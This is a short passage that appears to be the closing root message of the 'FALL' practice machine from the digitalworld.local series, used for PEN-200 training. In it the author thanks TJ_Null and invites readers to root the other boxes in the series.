	You may have first discovered the digitalworld.local series from looking for deliberately vulnerably machines to practise for the PEN-200 (thank you TJ_Null for featuring my boxes on the training list!)

	I hope to have played my little part at enriching your PEN-200 journey.

	Want to find the author? Find the author on Linkedin by rooting other boxes in this series!
	[root@FALL ~]# 
	```
